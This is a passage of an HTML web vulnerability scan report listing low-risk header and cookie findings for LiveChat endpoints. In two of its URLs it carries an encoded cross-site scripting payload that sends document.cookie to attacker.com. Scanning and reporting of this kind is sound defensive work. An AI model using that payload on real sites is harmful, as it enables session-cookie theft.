+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/get_dynamic_config.js?t=1514645820192&amp;referrer=&amp;url=https%3A%2F%2Fmsoffice365.ae%2Fcontact-sales.html%3Freason%3D%253Cscript%253Edocument.location%3D%2527https%3A%2F%2Fattacker.com%2Flog.php%3Fc%3D%2527%2520%2B%2520encodeURIComponent(document.cookie)%253C%2Fscript%253E&amp;params=&amp;jsonp=__lc_data_77080&amp;groups=2</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">__livechat</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">Set-Cookie: __livechat</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">63</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure that the secure flag is set for cookies containing such sensitive information.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://www.owasp.org/index.php/Testing_for_cookies_attributes_(OWASP-SM-002)</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">614</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">13</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">X-Content-Type-Options Header Missing</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?u5QWiG9FeGeVwqSnR24V&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645864058EnQ4HU1%22%7D&amp;_=1514645824000</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?aIHnMyC6fu8QRWRiEzgF&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645989547mTBZ22J%22%7D&amp;_=1514645824025</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?WA21naFUv7i9aYerZFON&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645834135JxnRG6m%22%7D&amp;_=1514645823994</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?H5Npm6h3nuhtZIeDMu2y&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514646009545tnvqQT7%22%7D&amp;_=1514645824029</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?UdPwBsWfRqL0D8CO5J5d&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645964563GhJxAPo%22%7D&amp;_=1514645824020</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?6bQ2KXeUXG2KrhjRmgMQ&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514646024558A1VUyHE%22%7D&amp;_=1514645824032</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?lirCwvUKr17YOzUX5k3r&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514646004542HrrUqTw%22%7D&amp;_=1514645824028</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?W1kWmjzJhbIeUss3IXE3&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645849096rXFRgQW%22%7D&amp;_=1514645823997</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?QCGiKj66EtsAlpH6h0Pe&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645869045ZfNW5vo%22%7D&amp;_=1514645824001</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646019555&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_532886</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/open_chat.cgi?groups=2&amp;embedded=1&amp;newWebserv=undefined&amp;__lc_vv=2&amp;session_id=S1513858898.257ad89b2a&amp;server=secure.livechatinc.com</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645881008&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_962897</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?rTDgocUj5J20WzLrLI1o&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645859071hYatmBy%22%7D&amp;_=1514645823999</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?ujQk8bd0ifm30ZMZVqKR&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514646064555hLQdq6V%22%7D&amp;_=1514645824040</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?WEcWLLAIt8RJbgy0b4wn&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%22151464608455130tWiSH%22%7D&amp;_=1514645824044</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?xH0dOpu0pCHylzNhjdu4&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514646079551U1B2yPm%22%7D&amp;_=1514645824043</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?prO8EOUvzsCNy83iX8y0&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645889579Dm6ascc%22%7D&amp;_=1514645824005</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645995543&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_788239</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?NsMtfzBY9ClUrvnDDAPW&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645844109IEAYGwU%22%7D&amp;_=1514645823996</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514646084546&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_880778</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Instances</td><td width="80%">86</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Solution</td><td width="80%"><p>Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.</p><p>If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Other information</td><td width="80%"><p>This issue still applies to error type pages (401, 403, 500, etc) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.</p><p>At "High" threshold this scanner will not alert on client or server error responses.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Reference</td><td width="80%"><p>http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx</p><p>https://www.owasp.org/index.php/List_of_useful_HTTP_headers</p></td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">CWE Id</td><td width="80%">16</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">WASC Id</td><td width="80%">15</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Source ID</td><td width="80%">3</td>
+</tr>
+
+</table>
+<div class="spacer"></div>
+<table width="100%" class="results">
+  
+  
+  
+<tr height="24" class="risk-low">
+<a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Incomplete or No Cache-control and Pragma HTTP Header Set</th>
+</tr>
+  
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%">Description</td><td width="80%"><p>The cache-control and pragma HTTP header have not been set properly or are missing allowing the browser and proxies to cache content.</p></td>
+</tr>
+<TR vAlign="top">
+<TD colspan="2"></TD>
+</TR>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?QUHUPszVYxfnMIdCd9u3&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%2215146460545557q5CiBa%22%7D&amp;_=1514645824038</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?moGxCTgTFzkDC3vCKjDC&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645954569Gxq4hNf%22%7D&amp;_=1514645824018</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645952561&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_947180</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645813675&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_470283</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?oM6AMuSH9L1nEUe8XSkG&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514646049557C6EDyZ5%22%7D&amp;_=1514645824037</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?xiP22YHcsKERVAT2NsyK&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645984547pxfhEVB%22%7D&amp;_=1514645824024</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645854071&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_148086</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645962557&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_219484</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645860057&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_503013</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645905568&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_266776</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645984542&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_559814</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/status_ping?d90zwzScm8yOVwRildTA&amp;jsonp=jQuery111305916879558540828_1514645823992&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%2C%22skill%22%3A2%2C%22random_id%22%3A%221514645839122pwKMjOw%22%7D&amp;_=1514645823995</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/ping?t=1514645942564&amp;data=%7B%22visitor%22%3A%7B%22id%22%3A%22S1513858898.257ad89b2a%22%7D%7D&amp;jsonp=__lc_ping_717303</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent1">URL</td><td width="80%">https://secure.livechatinc.com/licence/1079046/v2/get_dynamic_config.js?t=1514645820192&amp;referrer=&amp;url=https%3A%2F%2Fmsoffice365.ae%2Fcontact-sales.html%3Freason%3D%253Cscript%253Edocument.location%3D%2527https%3A%2F%2Fattacker.com%2Flog.php%3Fc%3D%2527%2520%2B%2520encodeURIComponent(document.cookie)%253C%2Fscript%253E&amp;params=&amp;jsonp=__lc_data_77080&amp;groups=2</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Parameter</td><td width="80%">Cache-Control</td>
+</tr>
+  
+<tr bgcolor="#e8e8e8">
+<td width="20%" class="indent2">Evidence</td><td width="80%">max-age=0, no-cache, no-store</td>
+</tr>
+  
+  
+  
+<tr bgcolor="#e8e8e8">
